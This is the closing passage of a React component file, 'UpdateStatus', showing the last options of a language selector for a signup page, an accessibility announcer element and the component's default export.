                            <option label="Hrvatski" lang="hr" value="/signup/creditoption?locale=hr-TN">Hrvatski</option>
                            <option label="Українська" lang="uk" value="/signup/creditoption?locale=uk-TN">Українська</option>
                            <option label="Filipino" lang="fil" value="/signup/creditoption?locale=fil-TN">Filipino</option>
                          </select>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="a11yAnnouncer" aria-live="assertive" tabIndex="-1"></div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div></div>
    </div>
  );
};

export default UpdateStatus;
